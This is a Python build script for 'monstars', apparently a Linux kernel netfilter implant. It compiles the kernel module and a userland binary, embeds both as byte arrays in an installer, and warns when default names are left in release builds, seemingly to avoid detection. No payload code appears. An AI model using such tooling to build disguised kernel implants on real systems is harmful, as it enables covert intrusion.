"""Come on and SLAM! And welcome to the JAM!"""
import argparse
import glob
import os
import pathlib
import shutil
import subprocess

ROOT_DIR = pathlib.Path(__file__).parent
BUILD_DIR = ROOT_DIR / "build"
INSTALLER_DIR = ROOT_DIR / "installer"
KERNEL_DIR = ROOT_DIR / "kernel"
USER_DIR = ROOT_DIR / "user"

DEFAULT_EXE_NAME = "monstars"
DEFAULT_INSTALLER_NAME = "go-monstars"
DEFAULT_KO_NAME = "monstars_nf"

KO_PRECOMPILED_H = "ko_precompiled.h"
KO_CONST_NAME = "c_KernelMod"

USER_PRECOMPILED_H = "user_precompiled.h"
USER_CONST_NAME = "c_UserExe"

KERNEL_VERSIONS = [
    "3.11.0-12-generic",
    "3.13.0-24-generic",
    "4.4.0-21-generic",
    "4.15.0-20-generic",
    "5.15.0-56-generic",
]

KERNEL_C_FLAGS = {
    "3": "-D__GNUC__=4 -fno-pie -Wno-pointer-sign -Wno-attributes -Wno-missing-attributes -mfentry",
    "4": "-fno-pie -Wno-pointer-sign -Wno-attributes -mfentry",
}


def _generate_header(src_path, dst_path, var_name):
    """Generate a header from a precompiled binary"""
    print(f"\n\n** Generating {dst_path}...")
    with open(src_path, "rb") as f:
        bin_str = bytes.hex(f.read())
        arr_elems = [f"0x{bin_str[i:i+2]}" for i in range(0, len(bin_str), 2)]
    with open(dst_path, "w") as hdr:
        hdr.write(
            "/*\n"
            " *  This is a generated header file.\n"
            " */"
        )
        # char c_KernelMod[4944] = {0x7f, 0x45, 0x4c, 0x46, ... };
        hdr.write(
            "\n\n"
            f"char {var_name}[{len(arr_elems)}] = {{{', '.join(arr_elems)}}};"
        )


def run_build(kernel_ver, ko_name, exe_name, installer_name, debug):
    """Build it!"""
    target = "debug" if debug else ""
    os.environ.update(
        {
            "KERNEL_VER": kernel_ver,
            "MOD": ko_name,
            "USER_EXE": exe_name,
            "INSTALLER": installer_name,
            "KFLAGS": KERNEL_C_FLAGS.get(kernel_ver[0], ""),
        }
    )
    # Cleanup old build artifacts for this kernel
    if os.path.isdir(BUILD_DIR / kernel_ver):
        shutil.rmtree(BUILD_DIR / kernel_ver)
    os.makedirs(BUILD_DIR / kernel_ver, exist_ok=True)

    # Build kernel module
    print(f"\n\n** Building {ko_name}.ko for {kernel_ver}...\n")
    tempname = (ko_name != DEFAULT_KO_NAME)
    if tempname:
        shutil.copyfile(KERNEL_DIR / f"{DEFAULT_KO_NAME}.c", KERNEL_DIR / f"{ko_name}.c")
    subprocess.run(
        f"make {target}", cwd=KERNEL_DIR, shell=True
    )
    # Cleanup kbuild
    if tempname:
        os.unlink(KERNEL_DIR / f"{ko_name}.c")
    subprocess.run(
        "make clean", cwd=KERNEL_DIR, shell=True
    )

    # Build userland executable
    print(f"\n\n** Building {exe_name} for {kernel_ver}...\n")
    subprocess.run(
        f"make {target}", cwd=USER_DIR, shell=True
    )

    # Generate precompiled headers
    _generate_header(
        BUILD_DIR / kernel_ver / f"{ko_name}.ko",
        BUILD_DIR / kernel_ver / KO_PRECOMPILED_H,
        KO_CONST_NAME,
    )
    _generate_header(
        BUILD_DIR / kernel_ver / exe_name,
        BUILD_DIR / kernel_ver / USER_PRECOMPILED_H,
        USER_CONST_NAME,
    )

    # Build installer executable
    print(f"\n\n** Building {installer_name} for {kernel_ver}...\n")
    subprocess.run(
        f"make {target}", cwd=INSTALLER_DIR, shell=True
    )


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="summon the monstars!")
    parser.add_argument(
        "-d", "--debug",
        action="store_true",
        help="build components with debug symbols",
    )
    parser.add_argument(
        "-e", "--exe-name",
        default=DEFAULT_EXE_NAME,
        help="name to use for the userland executable",
    )
    parser.add_argument(
        "-i", "--installer-name",
        default=DEFAULT_INSTALLER_NAME,
        help="name to use for the userland executable",
    )
    parser.add_argument(
        "-v", "--kernel-ver",
        default=KERNEL_VERSIONS[-1],
        choices=KERNEL_VERSIONS,
        help="linux kernel version to build against",
    )
    parser.add_argument(
        "-k", "--ko-name",
        default=DEFAULT_KO_NAME,
        help="name to use for the kernel netfilter module",
    )
    args = parser.parse_args()
    if args.exe_name == DEFAULT_EXE_NAME and not args.debug:
        print("*** WARNING: USED DEFAULT EXE NAME FOR NON-DEBUG BUILD ***")
    if args.installer_name == DEFAULT_EXE_NAME and not args.debug:
        print("*** WARNING: USED DEFAULT INSTALLER NAME FOR NON-DEBUG BUILD ***")
    if args.ko_name == DEFAULT_KO_NAME and not args.debug:
        print("*** WARNING: USED DEFAULT KO NAME FOR NON-DEBUG BUILD ***")
    run_build(args.kernel_ver, args.ko_name, args.exe_name, args.installer_name, args.debug)
